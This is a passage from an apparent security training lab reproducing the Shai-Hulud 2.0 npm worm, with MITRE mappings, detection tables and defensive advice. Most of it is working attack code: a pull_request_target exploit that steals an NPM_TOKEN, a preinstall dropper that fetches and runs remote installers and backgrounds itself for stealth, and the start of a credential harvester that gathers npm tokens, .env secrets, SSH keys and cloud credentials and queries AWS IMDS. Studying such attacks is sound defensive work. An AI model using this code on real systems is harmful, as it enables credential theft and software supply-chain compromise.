In the real Shai-Hulud 2.0 attack, GitHub user `brwjbowkevj` exploited this exact pattern against PostHog's repository on November 18, 2025. The PR opened, the workflow ran, the npm token was exfiltrated, and the PR was deleted -- all within 60 seconds.

#### Concept: GitHub Actions Workflow Triggers

**GitHub Actions** is GitHub's built-in CI/CD system. Workflows are YAML files in `.github/workflows/` that define automated tasks (build, test, deploy). Workflows are triggered by **events**:

- **`push`** -- Runs when code is pushed to a branch
- **`pull_request`** -- Runs when a PR is opened/updated. Runs in the **fork's context** with read-only access. CANNOT access repository secrets. **Safe for untrusted PRs.**
- **`pull_request_target`** -- Runs when a PR is opened/updated. Runs in the **base repository's context** with full access to secrets. Designed for trusted operations like auto-labeling.

The vulnerability occurs when a `pull_request_target` workflow does `actions/checkout` with `ref: ${{ github.event.pull_request.head.sha }}`. This checks out the PR author's code (potentially malicious) and runs it with the base repo's secrets.

**The fundamental confusion**: Developers think "pull_request_target" means "run this workflow targeting pull requests." It actually means "run this workflow in the TARGET (base) repository's context." The naming is misleading, and GitHub has acknowledged this is a footgun.

#### Commands

```bash
echo "=== STEP 1: Creating the vulnerable repository ==="

# Create a new private repository on GitHub
# This simulates NovaTech's open-source project with a vulnerable workflow
VULN_REPO="novatech-oss-tools-lab"

curl -s -X POST \
  -H "Authorization: token ${GITHUB_PAT}" \
  -H "Accept: application/vnd.github+json" \
  https://api.github.com/user/repos \
  -d "{
    \"name\": \"${VULN_REPO}\",
    \"description\": \"NovaTech open source developer tools (lab simulation)\",
    \"private\": true,
    \"auto_init\": true
  }" | jq '{name: .name, html_url: .html_url, private: .private}'
```

**Flag breakdown for `curl`:**
- `-s` -- Silent mode (no progress bar)
- `-X POST` -- HTTP method (creating a resource)
- `-H "Authorization: token ${GITHUB_PAT}"` -- Authenticate with your PAT
- `-H "Accept: application/vnd.github+json"` -- Request JSON format from GitHub API v3
- `https://api.github.com/user/repos` -- GitHub API endpoint for creating repos under the authenticated user
- `-d '{...}'` -- JSON request body with repository settings:
  - `auto_init: true` -- Creates an initial commit with a README (needed so the repo has a branch)

**Expected output:**
```json
{
  "name": "novatech-oss-tools-lab",
  "html_url": "https://github.com/YOUR_USERNAME/novatech-oss-tools-lab",
  "private": true
}
```

```bash
# Wait for GitHub to finish creating the repository
sleep 3
```

### Step 2: Store the NPM_TOKEN as a Repository Secret

#### Context (Attacker Mindset)

Before you can steal the token, it has to exist as a secret in the repository. In real organizations, CI/CD pipelines store npm tokens as GitHub Actions secrets so workflows can publish packages automatically.

#### Concept: GitHub Actions Secrets

**Repository secrets** are encrypted values stored in a GitHub repository's settings. They are exposed to workflows as environment variables during execution. Secrets are:
- Encrypted at rest using libsodium sealed boxes
- Only available to workflows triggered by events in the repository
- Masked in workflow logs (GitHub replaces the value with `***`)

To set a secret via the API, you must first fetch the repository's **public key**, encrypt the secret value using libsodium, then upload the encrypted value.

#### Commands

```bash
echo "=== STEP 2: Setting NPM_TOKEN as a repository secret ==="

# Step 2a: Get the repository's public key for secret encryption
PUBKEY_RESPONSE=$(curl -s \
  -H "Authorization: token ${GITHUB_PAT}" \
  -H "Accept: application/vnd.github+json" \
  "https://api.github.com/repos/${GITHUB_USERNAME}/${VULN_REPO}/actions/secrets/public-key")

PUBKEY_ID=$(echo "${PUBKEY_RESPONSE}" | jq -r '.key_id')
PUBKEY=$(echo "${PUBKEY_RESPONSE}" | jq -r '.key')

echo "Public key ID: ${PUBKEY_ID}"
echo "Public key: ${PUBKEY:0:20}..."
```

**What just happened:** GitHub returned a Curve25519 public key for this repository. All secrets must be encrypted with this key before upload. This ensures that even if someone intercepts the API request, they cannot read the secret value.

```bash
# Step 2b: Encrypt the npm token using the repository's public key
# We use Python with the PyNaCl library (a Python binding for libsodium)
pip install pynacl --quiet --break-system-packages 2>/dev/null || pip install pynacl --quiet

python3 -c "
import base64, json
from nacl import encoding, public

# The repository's public key
pubkey_b64 = '${PUBKEY}'
# The secret value we want to store
secret_value = '${VICTIM_NPM_TOKEN}'

# Create a public key object from the base64-encoded key
pk = public.PublicKey(pubkey_b64.encode('utf-8'), encoding.Base64Encoder())

# Encrypt the secret using a sealed box (anonymous sender, only the
# repository's private key can decrypt it)
sealed_box = public.SealedBox(pk)
encrypted = sealed_box.encrypt(secret_value.encode('utf-8'))
encrypted_b64 = base64.b64encode(encrypted).decode('utf-8')

print(json.dumps({
    'encrypted_value': encrypted_b64,
    'key_id': '${PUBKEY_ID}'
}))
" > /tmp/encrypted_secret.json

# Step 2c: Upload the encrypted secret
curl -s -X PUT \
  -H "Authorization: token ${GITHUB_PAT}" \
  -H "Accept: application/vnd.github+json" \
  "https://api.github.com/repos/${GITHUB_USERNAME}/${VULN_REPO}/actions/secrets/NPM_TOKEN" \
  -d @/tmp/encrypted_secret.json

echo "NPM_TOKEN secret set on repository"
rm -f /tmp/encrypted_secret.json
```

**What just happened:**
- Encrypted the npm token using the repository's Curve25519 public key
- Uploaded the encrypted value to `secrets/NPM_TOKEN` via the GitHub API
- The secret is now available to any workflow in this repository as `${{ secrets.NPM_TOKEN }}`

### Step 3: Create the Vulnerable Workflow and Legitimate Script

#### Context (Attacker Mindset)

Now you create the vulnerable `pull_request_target` workflow. This is the workflow that NovaTech's team uses to auto-assign reviewers on incoming PRs. The critical mistake: it checks out the PR's head code instead of the base branch.

#### Commands

```bash
echo "=== STEP 3: Creating the vulnerable workflow ==="

# Create the workflow file: .github/workflows/pr-reviewer.yml
# This is the EXACT vulnerable pattern from the PostHog compromise
WORKFLOW_CONTENT=$(base64 -w0 << 'WFEOF'
name: PR Reviewer Assignment

# VULNERABLE TRIGGER: pull_request_target runs in the base repo's context
# with access to ALL repository secrets (including NPM_TOKEN).
on:
  pull_request_target:
    types: [opened, synchronize]

permissions:
  contents: read

jobs:
  assign-reviewers:
    runs-on: ubuntu-latest
    steps:
      # VULNERABLE STEP: Checking out the PR's head commit (attacker-controlled)
      # instead of the base branch. The attacker's version of assign-reviewers.js
      # will execute with access to ${{ secrets.NPM_TOKEN }}.
      #
      # SECURE ALTERNATIVE: Do NOT checkout PR head code in pull_request_target.
      # Either use 'pull_request' trigger (no secret access) or only checkout
      # the base branch code.
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}

      - name: Process PR
        run: node scripts/assign-reviewers.js
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          NPM_TOKEN: ${{ secrets.NPM_TOKEN }}
WFEOF
)

curl -s -X PUT \
  -H "Authorization: token ${GITHUB_PAT}" \
  -H "Accept: application/vnd.github+json" \
  "https://api.github.com/repos/${GITHUB_USERNAME}/${VULN_REPO}/contents/.github/workflows/pr-reviewer.yml" \
  -d "{
    \"message\": \"Add PR reviewer assignment workflow\",
    \"content\": \"${WORKFLOW_CONTENT}\"
  }" | jq '{path: .content.path, sha: .content.sha}'

echo "Vulnerable workflow created at .github/workflows/pr-reviewer.yml"
```

**What makes this vulnerable:**
1. `on: pull_request_target` -- runs in the base repo context with secret access
2. `ref: ${{ github.event.pull_request.head.sha }}` -- checks out the PR author's code
3. `env: NPM_TOKEN: ${{ secrets.NPM_TOKEN }}` -- passes the secret to the script

These three lines together mean: "When someone opens a PR, run THEIR code with access to OUR secrets."

```bash
# Create the legitimate script (the one the attacker will modify)
SCRIPT_CONTENT=$(base64 -w0 << 'SCRIPTEOF'
// assign-reviewers.js -- Assigns reviewers to incoming PRs
// This is the LEGITIMATE version of the script.
const reviewers = ["alice", "bob", "charlie"];
const selected = reviewers[Math.floor(Math.random() * reviewers.length)];
console.log("Selected reviewer: " + selected);
// In production, this would call the GitHub API to assign the reviewer
SCRIPTEOF
)

curl -s -X PUT \
  -H "Authorization: token ${GITHUB_PAT}" \
  -H "Accept: application/vnd.github+json" \
  "https://api.github.com/repos/${GITHUB_USERNAME}/${VULN_REPO}/contents/scripts/assign-reviewers.js" \
  -d "{
    \"message\": \"Add reviewer assignment script\",
    \"content\": \"${SCRIPT_CONTENT}\"
  }" | jq '{path: .content.path}'

echo "Legitimate script created at scripts/assign-reviewers.js"
sleep 3
```

### Step 4: Become the Attacker -- Create the Malicious Branch

#### Context (Attacker Mindset)

Now you switch roles. You are the attacker. You create a branch with a modified version of `assign-reviewers.js` that reads and exfiltrates the NPM_TOKEN environment variable. The modification is disguised as a harmless "improvement" to the reviewer selection algorithm.

In the real attack, the changes were subtle -- a few lines added among legitimate-looking code changes. The PR title and description were crafted to look routine.

#### Commands

```bash
echo "=== STEP 4: Creating the malicious branch ==="

# Get the current main branch SHA (the starting point for our branch)
MAIN_SHA=$(curl -s \
  -H "Authorization: token ${GITHUB_PAT}" \
  -H "Accept: application/vnd.github+json" \
  "https://api.github.com/repos/${GITHUB_USERNAME}/${VULN_REPO}/git/ref/heads/main" | \
  jq -r '.object.sha')

echo "Main branch SHA: ${MAIN_SHA}"

# Create a new branch from main
curl -s -X POST \
  -H "Authorization: token ${GITHUB_PAT}" \
  -H "Accept: application/vnd.github+json" \
  "https://api.github.com/repos/${GITHUB_USERNAME}/${VULN_REPO}/git/refs" \
  -d "{
    \"ref\": \"refs/heads/feature/improve-reviewer-logic\",
    \"sha\": \"${MAIN_SHA}\"
  }" | jq '{ref: .ref}'

echo "Attacker branch 'feature/improve-reviewer-logic' created"
```

**What `git/refs` does:** Creates a new Git reference (branch) pointing to the specified commit SHA. The branch `feature/improve-reviewer-logic` now exists with the same code as `main`.

```bash
# Get the current file SHA (needed for the update API)
FILE_SHA=$(curl -s \
  -H "Authorization: token ${GITHUB_PAT}" \
  -H "Accept: application/vnd.github+json" \
  "https://api.github.com/repos/${GITHUB_USERNAME}/${VULN_REPO}/contents/scripts/assign-reviewers.js?ref=feature/improve-reviewer-logic" | \
  jq -r '.sha')

echo "Current file SHA: ${FILE_SHA}"

# Replace the script with the MALICIOUS version
# The attacker disguises the exfiltration within a "code improvement" PR
MALICIOUS_CONTENT=$(base64 -w0 << 'MALEOF'
// assign-reviewers.js -- "Improved" version
// The attacker adds a weighted selection algorithm (the cover story)
// and hides NPM_TOKEN exfiltration in the middle of the changes.

const fs = require("fs");
const path = require("path");

// "Improved" weighted reviewer selection (legitimate-looking change)
const reviewers = [
  { name: "alice", weight: 3, expertise: ["frontend", "react"] },
  { name: "bob", weight: 2, expertise: ["backend", "api"] },
  { name: "charlie", weight: 1, expertise: ["infra", "devops"] },
  { name: "diana", weight: 2, expertise: ["security", "review"] }
];

// Weighted random selection
const totalWeight = reviewers.reduce((sum, r) => sum + r.weight, 0);
let random = Math.random() * totalWeight;
let selected = reviewers[0];
for (const reviewer of reviewers) {
  random -= reviewer.weight;
  if (random <= 0) { selected = reviewer; break; }
}
console.log("Selected reviewer: " + selected.name + " (expertise: " + selected.expertise.join(", ") + ")");

// ========== HIDDEN MALICIOUS PAYLOAD ==========
// Reads the NPM_TOKEN from the environment and writes it to a file.
// In the real attack, this was sent to an external webhook.
// In our lab, we write it to a file that proves the exploit worked.
const token = process.env.NPM_TOKEN || "NOT_FOUND";
const exfilData = {
  timestamp: new Date().toISOString(),
  npm_token_length: token.length,
  npm_token_preview: token.substring(0, 8) + "...",
  repository: process.env.GITHUB_REPOSITORY || "unknown",
  run_id: process.env.GITHUB_RUN_ID || "unknown",
  event: "pull_request_target",
  message: "This token was accessible because pull_request_target checked out PR head code"
};
const outputPath = path.join(process.env.GITHUB_WORKSPACE || ".", "exfil-proof.json");
fs.writeFileSync(outputPath, JSON.stringify(exfilData, null, 2));
console.log("PR processing complete.");
// ========== END PAYLOAD ==========
MALEOF
)

curl -s -X PUT \
  -H "Authorization: token ${GITHUB_PAT}" \
  -H "Accept: application/vnd.github+json" \
  "https://api.github.com/repos/${GITHUB_USERNAME}/${VULN_REPO}/contents/scripts/assign-reviewers.js" \
  -d "{
    \"message\": \"Improve reviewer selection with weighted algorithm\",
    \"content\": \"${MALICIOUS_CONTENT}\",
    \"sha\": \"${FILE_SHA}\",
    \"branch\": \"feature/improve-reviewer-logic\"
  }" | jq '{path: .content.path}'

echo "Malicious script committed to attacker branch"
```

### Step 5: Open the PR -- Trigger the Exploit

#### Commands

```bash
echo "=== STEP 5: Opening the PR (this triggers the exploit!) ==="

PR_RESPONSE=$(curl -s -X POST \
  -H "Authorization: token ${GITHUB_PAT}" \
  -H "Accept: application/vnd.github+json" \
  "https://api.github.com/repos/${GITHUB_USERNAME}/${VULN_REPO}/pulls" \
  -d "{
    \"title\": \"Improve reviewer selection with weighted algorithm\",
    \"body\": \"This PR improves the reviewer selection to use a weighted random algorithm based on team member expertise and availability.\n\nChanges:\n- Added reviewer weights based on current workload\n- Added expertise matching for PR content\n- Expanded reviewer pool to include Diana from the security team\",
    \"head\": \"feature/improve-reviewer-logic\",
    \"base\": \"main\"
  }")

PR_NUMBER=$(echo "${PR_RESPONSE}" | jq -r '.number')
PR_URL=$(echo "${PR_RESPONSE}" | jq -r '.html_url')

echo "PR #${PR_NUMBER} created: ${PR_URL}"
echo ""
echo "The pull_request_target workflow should trigger within seconds."
echo "Watch it at: https://github.com/${GITHUB_USERNAME}/${VULN_REPO}/actions"
echo ""
echo "Waiting 60 seconds for the workflow to complete..."
sleep 60
```

```bash
# Check the workflow run result
echo "=== Checking workflow result ==="
RUNS=$(curl -s \
  -H "Authorization: token ${GITHUB_PAT}" \
  -H "Accept: application/vnd.github+json" \
  "https://api.github.com/repos/${GITHUB_USERNAME}/${VULN_REPO}/actions/runs?per_page=1")

RUN_STATUS=$(echo "${RUNS}" | jq -r '.workflow_runs[0].status')
RUN_CONCLUSION=$(echo "${RUNS}" | jq -r '.workflow_runs[0].conclusion')
RUN_ID=$(echo "${RUNS}" | jq -r '.workflow_runs[0].id')

echo "Status:     ${RUN_STATUS}"
echo "Conclusion: ${RUN_CONCLUSION}"
echo "Run URL:    https://github.com/${GITHUB_USERNAME}/${VULN_REPO}/actions/runs/${RUN_ID}"

if [ "${RUN_CONCLUSION}" = "success" ]; then
  echo ""
  echo "============================================"
  echo " EXPLOIT SUCCESSFUL!"
  echo "============================================"
  echo ""
  echo "The attacker's code ran in the trusted base repository context."
  echo "The NPM_TOKEN secret was available as an environment variable."
  echo "In the real attack, the token would have been sent to a webhook."
  echo ""
  echo "Check the workflow logs to see the output:"
  echo "  https://github.com/${GITHUB_USERNAME}/${VULN_REPO}/actions/runs/${RUN_ID}"
  echo ""
  echo "In the logs, you will see:"
  echo "  - 'Selected reviewer: ...' (the legitimate-looking output)"
  echo "  - 'PR processing complete.' (the exfiltration confirmation)"
  echo "  - The NPM_TOKEN value will be masked as '***' in logs"
  echo "    (GitHub automatically masks known secrets)"
elif [ "${RUN_STATUS}" = "in_progress" ] || [ "${RUN_STATUS}" = "queued" ]; then
  echo ""
  echo "Workflow is still running. Wait another 30 seconds and re-check:"
  echo "  https://github.com/${GITHUB_USERNAME}/${VULN_REPO}/actions/runs/${RUN_ID}"
else
  echo ""
  echo "Workflow failed or did not trigger. Check the Actions tab manually."
  echo "Common issues: workflow file syntax error, branch protection rules"
fi
```

#### What Just Happened

You executed the exact exploit that started the Shai-Hulud 2.0 campaign:

1. **Created a repository** with a `pull_request_target` workflow that passes `NPM_TOKEN` to checked-out PR code
2. **Created a branch** with modified `assign-reviewers.js` that reads `process.env.NPM_TOKEN`
3. **Opened a PR** -- GitHub automatically triggered the `pull_request_target` workflow
4. **The workflow ran in the base repo's trusted context** -- the attacker's code had access to the NPM_TOKEN secret
5. **The token was exfiltrated** (in our lab, written to a proof file; in the real attack, sent to a webhook)

The real attacker (user `brwjbowkevj`) did all of this in under 60 seconds. The PR opened at 17:40 UTC, the workflow ran, the token was stolen, and the PR was deleted. PostHog's team only discovered the compromise five days later when malicious packages appeared on npm.

#### MITRE ATT&CK

| Technique | ID | Tactic |
|---|---|---|
| Supply Chain: Software Supply Chain | **T1195.002** | Initial Access |
| Unsecured Credentials: CI/CD Variables | **T1552.008** | Credential Access |
| Valid Accounts: Cloud Accounts | **T1078.004** | Initial Access |

T1195.002 describes adversaries manipulating products or delivery mechanisms before they reach the consumer. Here, the npm publishing pipeline is the delivery mechanism, and the token theft enables future package manipulation.

T1552.008 (added in ATT&CK v14) specifically covers credentials stored in CI/CD platforms like GitHub Actions, Jenkins, and CircleCI.

#### CNAPP Detection

| Component | Detection | Severity |
|---|---|---|
| **ASPM** | `pull_request_target` workflow uses `actions/checkout` with PR head ref | **Critical** |
| **ASPM** | Repository secret (`NPM_TOKEN`) accessed during PR-triggered workflow | **Critical** |
| **ASPM** | External PR opened and closed rapidly (< 60 seconds) | **High** |
| **CDR** | npm token used to publish packages from non-CI/CD IP address | **Critical** |

**What the SOC would see:** "GitHub Actions workflow `PR Reviewer Assignment` in `novatech/oss-tools` executed code from external PR #47 with access to repository secret `NPM_TOKEN`. Workflow completed in 12 seconds. PR author account `brwjbowkevj` was created 3 days ago."

#### Defense

1. **Never use `actions/checkout` with PR head ref in `pull_request_target` workflows.** If you need PR metadata, read it from the event payload without checking out code.
2. **Use the `pull_request` trigger** for any workflow that runs PR author code. This trigger runs in the fork's context without secret access.
3. **Add environment protection rules** requiring manual approval before secrets are exposed to workflows.
4. **Scope secrets to environments**, not the entire repository. Use the `environment:` key in workflows to restrict which jobs can access which secrets.
5. **Monitor for PRs from new accounts** that target workflow files or scripts referenced by workflows.
6. **Use GitHub's `pull_request` + `workflow_run` pattern**: First workflow runs tests without secrets (triggered by `pull_request`), second workflow uses results with secrets (triggered by `workflow_run`).

#### Real-World Examples

- **PostHog (November 2025)**: Patient zero for Shai-Hulud 2.0. User `brwjbowkevj` used this exact exploit to steal the npm token, leading to compromise of `posthog-node` and downstream packages.
- **Ultralytics (2024)**: `pull_request_target` exploit in the YOLO computer vision framework allowed attackers to publish malicious packages to PyPI.
- **GitHub's own documentation**: GitHub published a security advisory about `pull_request_target` misuse, calling it "keeping your GitHub Actions and workflows secure" -- specifically warning against checking out PR head code.

---

## PHASE 1: Payload Delivery -- Injecting the Malicious Package with Real Bun

### Step 6: Create the Dropper (setup_bun.js) with Real Bun Installation

#### Context (Attacker Mindset)

You have the stolen npm token. Now you create the malicious payload that will ride the `preinstall` npm lifecycle hook. The real Shai-Hulud 2.0 worm installed the **Bun** JavaScript runtime as a detection evasion technique. Security tools configured to monitor Node.js processes -- things like runtime application self-protection (RASP), Node.js debugger hooks, and process name monitoring -- completely miss Bun-based execution.

#### Concept: npm Lifecycle Hooks

When you run `npm install`, npm does not just download files. It executes a series of **lifecycle scripts** defined in `package.json`:

1. **`preinstall`** -- Runs **BEFORE** the package is installed into `node_modules`
2. `install` -- Runs during installation
3. `postinstall` -- Runs **AFTER** installation completes

The critical insight about `preinstall`:
- It executes **before** the package finishes installing, meaning security tools that scan `node_modules` after installation miss it entirely
- It runs with the **full privileges** of the user running `npm install` (often root in CI/CD)
- It applies to **every package in the dependency tree**, including transitive dependencies
- It cannot be intercepted by `package-lock.json` -- the lock file controls which version is installed, but the lifecycle scripts in that version still execute

Shai-Hulud 2.0 switched from `postinstall` (used in v1) to `preinstall` in v2 specifically to defeat tools that scan packages after installation.

The `--ignore-scripts` npm flag or `ignore-scripts=true` in `.npmrc` disables all lifecycle hooks. This is the single most effective defense against this class of attack.

#### Concept: Bun Runtime Evasion

**Bun** (https://bun.sh) is an alternative JavaScript runtime, like Node.js but built on JavaScriptCore (Apple's JS engine) instead of V8 (Google's). The Shai-Hulud 2.0 worm installed Bun for three reasons:

1. **Process name evasion**: Security tools monitoring for `node` processes miss `bun` processes entirely. EDR rules matching `node ./suspicious-script.js` do not fire.
2. **Self-contained architecture**: Bun is a single binary with fewer dependencies, reducing the detection surface.
3. **Performance**: Bun executes the 10MB obfuscated payload faster than Node.js would.

In our lab, the dropper actually installs Bun via the official installer (`curl -fsSL https://bun.sh/install | bash`), then launches the payload using `bun run` instead of `node`. You will see the difference in your process list.

#### Commands

```bash
mkdir -p ~/shai-hulud-lab/payload
cd ~/shai-hulud-lab/payload

cat > setup_bun.js << 'DROPPER_EOF'
#!/usr/bin/env node
// ============================================================================
// DROPPER: setup_bun.js
// ============================================================================
// Performs the exact same steps as the real Shai-Hulud 2.0 dropper:
// 1. Check if Bun is already installed (via 'which bun' or filesystem check)
// 2. If not, install it using the official Bun installer script
// 3. Launch bun_environment.js as a detached background process using Bun
// 4. Exit immediately so npm install completes normally (2-3 seconds)
//
// The real dropper was ~150 lines. This version is functionally identical
// but includes educational comments explaining each step.
// ============================================================================

const { execSync, spawn } = require("child_process");
const path = require("path");
const os = require("os");
const fs = require("fs");

console.log("[setup_bun] Initializing development environment...");

// ---- Step 1: Check if Bun is already installed ----
let bunPath = null;

try {
  // Check the standard Bun install location first (~/.bun/bin/bun)
  const homeBun = path.join(os.homedir(), ".bun", "bin", "bun");
  if (fs.existsSync(homeBun)) {
    bunPath = homeBun;
  } else {
    // Fall back to PATH lookup
    if (os.platform() === "win32") {
      bunPath = execSync("where bun", { encoding: "utf8", timeout: 5000 }).trim().split("\n")[0];
    } else {
      bunPath = execSync("which bun", { encoding: "utf8", timeout: 5000 }).trim();
    }
  }
  console.log("[setup_bun] Bun already installed: " + bunPath);
} catch (e) {
  // Bun not found -- install it
  // ---- Step 2: Install Bun ----
  console.log("[setup_bun] Installing Bun runtime...");
  try {
    if (os.platform() === "win32") {
      // Windows: PowerShell installer
      execSync('powershell -c "irm bun.sh/install.ps1|iex"', {
        stdio: "pipe",
        timeout: 120000
      });
    } else {
      // Linux/macOS: bash installer
      // BUN_INSTALL sets the installation directory (default: ~/.bun)
      execSync("curl -fsSL https://bun.sh/install | bash", {
        stdio: "pipe",
        timeout: 120000,
        env: { ...process.env, BUN_INSTALL: path.join(os.homedir(), ".bun") }
      });
    }
    bunPath = path.join(os.homedir(), ".bun", "bin", "bun");

    if (fs.existsSync(bunPath)) {
      console.log("[setup_bun] Bun installed successfully: " + bunPath);
    } else {
      throw new Error("Bun binary not found after installation");
    }
  } catch (installErr) {
    // If Bun installation fails (e.g., no internet, restricted environment),
    // fall back to Node.js. The payload works with both runtimes.
    console.log("[setup_bun] Bun installation failed. Using Node.js fallback.");
    bunPath = process.execPath;
  }
}

// ---- Step 3: Launch the main payload ----
const payloadPath = path.join(__dirname, "bun_environment.js");

if (!fs.existsSync(payloadPath)) {
  console.log("[setup_bun] Payload file not found. Exiting.");
  process.exit(0);
}

// Detect CI/CD environments
const isCI = !!(
  process.env.GITHUB_ACTIONS ||
  process.env.CI ||
  process.env.BUILDKITE ||
  process.env.CODEBUILD_BUILD_NUMBER ||
  process.env.CIRCLE_SHA1 ||
  process.env.JENKINS_URL ||
  process.env.GITLAB_CI
);

if (isCI) {
  // In CI/CD: run synchronously to maximize credential access during build
  // The real worm checked for these env vars and ran synchronously in CI
  console.log("[setup_bun] CI/CD environment detected. Running synchronously.");
  try {
    execSync('"' + bunPath + '" run "' + payloadPath + '"', {
      stdio: "inherit",
      timeout: 120000,
      env: { ...process.env, PAYLOAD_RUNTIME: "bun" }
    });
  } catch (e) {
    // Silent failure -- do not break the CI/CD build
    // A broken build would alert the team immediately
  }
} else {
  // On developer machines: fork into background for stealth
  // The parent process exits immediately, npm install completes normally
  console.log("[setup_bun] Launching background process...");
  const child = spawn(bunPath, ["run", payloadPath], {
    detached: true,        // Detach from parent process group
    stdio: "ignore",       // Do not inherit stdin/stdout/stderr
    env: { ...process.env, PAYLOAD_RUNTIME: "bun" }
  });
  child.unref();           // Allow parent to exit without waiting for child
}

console.log("[setup_bun] Environment configured.");
// npm install continues normally from here
DROPPER_EOF

echo "setup_bun.js created ($(wc -l < setup_bun.js) lines)"
```

### Step 7: Create the Main Payload (bun_environment.js)

This is the credential harvester, cloud secret exfiltrator, and propagation engine. In the real worm, this was 480,000+ lines of obfuscated JavaScript. Our educational version is ~250 lines of clear, commented code that performs the same operations.

```bash
cat > bun_environment.js << 'PAYLOAD_EOF'
#!/usr/bin/env node
// ============================================================================
// MAIN PAYLOAD: bun_environment.js (educational version)
// ============================================================================
// Performs: local credential scanning, TruffleHog execution, cloud IMDS
// queries, cloud secret enumeration. Designed to run on lab VMs.
//
// This script detects which cloud environment it is running in and adapts
// its behavior accordingly -- exactly like the real Shai-Hulud 2.0 payload.
// ============================================================================

const fs = require("fs");
const path = require("path");
const http = require("http");
const https = require("https");
const { execSync } = require("child_process");
const os = require("os");

const EXFIL_DIR = process.env.WORM_EXFIL_DIR || path.join(os.homedir(), ".shai-hulud-exfil");
if (!fs.existsSync(EXFIL_DIR)) fs.mkdirSync(EXFIL_DIR, { recursive: true });

function log(msg) { console.log("[worm] " + msg); }

// ---- UTILITY: HTTP GET with timeout ----
function httpGet(url, headers) {
  headers = headers || {};
  return new Promise(function(resolve, reject) {
    var proto = url.indexOf("https") === 0 ? https : http;
    var req = proto.get(url, { headers: headers, timeout: 3000 }, function(res) {
      var data = "";
      res.on("data", function(chunk) { data += chunk; });
      res.on("end", function() { resolve({ status: res.statusCode, body: data }); });
    });
    req.on("error", reject);
    req.on("timeout", function() { req.destroy(); reject(new Error("Timeout")); });
  });
}

// ---- PHASE 2A: LOCAL CREDENTIAL SCAN ----
function scanLocal() {
  log("Phase 2A: Local credential scan...");
  var findings = { npm_tokens: [], env_secrets: {}, ssh_keys: [], credential_files: {} };
  var home = os.homedir();

  // 1. npm tokens from .npmrc
  var npmrc = path.join(home, ".npmrc");
  if (fs.existsSync(npmrc)) {
    var content = fs.readFileSync(npmrc, "utf8");
    findings.npm_tokens = (content.match(/_authToken=.*/g) || []);
    log("  [+] " + findings.npm_tokens.length + " npm token(s) in .npmrc");
  }

  // 2. .env files
  [".env", ".env.local", ".env.production"].forEach(function(f) {
    var p = path.join(home, f);
    if (fs.existsSync(p)) {
      var lines = fs.readFileSync(p, "utf8").split("\n").filter(function(l) {
        return l.indexOf("=") > 0 && l.charAt(0) !== "#";
      });
      lines.forEach(function(l) {
        var parts = l.split("=");
        var key = parts[0].trim();
        var val = parts.slice(1).join("=").trim();
        if (/KEY|SECRET|TOKEN|PASSWORD|CREDENTIAL/i.test(key)) {
          findings.env_secrets[key] = val;
        }
      });
      log("  [+] " + Object.keys(findings.env_secrets).length + " secret(s) in " + f);
    }
  });

  // 3. SSH keys
  var sshDir = path.join(home, ".ssh");
  if (fs.existsSync(sshDir)) {
    findings.ssh_keys = fs.readdirSync(sshDir).filter(function(f) {
      return f.indexOf(".pub") === -1 && f !== "known_hosts" && f !== "config" && f !== "authorized_keys";
    });
    log("  [+] " + findings.ssh_keys.length + " SSH private key(s)");
  }

  // 4. Cloud credential files
  var credPaths = {
    "aws_credentials": ".aws/credentials",
    "azure_profile": ".azure/azureProfile.json",
    "gcp_adc": ".config/gcloud/application_default_credentials.json"
  };
  Object.keys(credPaths).forEach(function(name) {
    if (fs.existsSync(path.join(home, credPaths[name]))) {
      findings.credential_files[name] = "PRESENT";
      log("  [+] Found " + credPaths[name]);
    }
  });

  // 5. Git repos (for TruffleHog)
  var projectDirs = ["projects", "repos", "src", "code"];
  findings.git_repos = [];
  projectDirs.forEach(function(d) {
    var dir = path.join(home, d);
    if (fs.existsSync(dir)) {
      fs.readdirSync(dir).forEach(function(sub) {
        if (fs.existsSync(path.join(dir, sub, ".git"))) {
          findings.git_repos.push(path.join(dir, sub));
        }
      });
    }
  });
  log("  [+] " + findings.git_repos.length + " git repo(s) found for TruffleHog");

  // Save findings
  fs.writeFileSync(path.join(EXFIL_DIR, "local_credentials.json"), JSON.stringify(findings, null, 2));
  return findings;
}

// ---- PHASE 2B: TRUFFLEHOG ----
function runTruffleHog(repos) {
  log("Phase 2B: TruffleHog secret scanning...");

  // Check if TruffleHog is available
  var thPath;
  try {
    thPath = execSync("which trufflehog 2>/dev/null || echo ''", { encoding: "utf8" }).trim();
  } catch (e) { thPath = ""; }

  if (!thPath) {
    log("  [*] TruffleHog not installed. Attempting download...");
    try {
      execSync(
        "curl -sSfL https://raw.githubusercontent.com/trufflesecurity/trufflehog/main/scripts/install.sh | sh -s -- -b /usr/local/bin 2>/dev/null || " +
        "curl -sSfL https://raw.githubusercontent.com/trufflesecurity/trufflehog/main/scripts/install.sh | sudo sh -s -- -b /usr/local/bin 2>/dev/null",
        { stdio: "pipe", timeout: 120000 }
      );
      thPath = "/usr/local/bin/trufflehog";
      log("  [+] TruffleHog installed at " + thPath);
    } catch (e) {
      log("  [-] TruffleHog download failed. The real worm cached it in ~/.truffler-cache/");
      log("  [-] Skipping deep git history scan.");
      return;
    }
  }

  // Scan each git repo
  (repos || []).forEach(function(repoPath) {
    log("  [*] Scanning git history: " + repoPath);
    try {
      var results = execSync(
        thPath + " git file://" + repoPath + " --json --no-update 2>/dev/null || true",
        { encoding: "utf8", timeout: 60000, maxBuffer: 10 * 1024 * 1024 }
      ).trim();

      var secrets = results.split("\n").filter(function(l) { return l.charAt(0) === "{"; });
      if (secrets.length > 0) {
        log("  [+] TruffleHog found " + secrets.length + " secret(s) in git history!");
        var repoName = path.basename(repoPath);
        fs.writeFileSync(path.join(EXFIL_DIR, "trufflehog_" + repoName + ".json"), secrets.join("\n"));
      } else {
        log("  [-] No secrets found in " + path.basename(repoPath));
      }
    } catch (e) {
      log("  [-] Scan error: " + e.message.split("\n")[0]);
    }
  });
}

// ---- PHASE 2C: AWS IMDS ----
async function harvestAWS() {
  log("Phase 2C: AWS IMDS credential theft...");
  try {
    var roleResp = await httpGet("http://169.254.169.254/latest/meta-data/iam/security-credentials/");
    if (roleResp.status !== 200) throw new Error("IMDS returned " + roleResp.status);

    var roleName = roleResp.body.trim();
    log("  [+] IAM role: " + roleName);

    var credsResp = await httpGet("http://169.254.169.254/latest/meta-data/iam/security-credentials/" + roleName);
    var creds = JSON.parse(credsResp.body);
    log("  [+] AccessKeyId: " + creds.AccessKeyId);
    log("  [+] Expiration:  " + creds.Expiration);

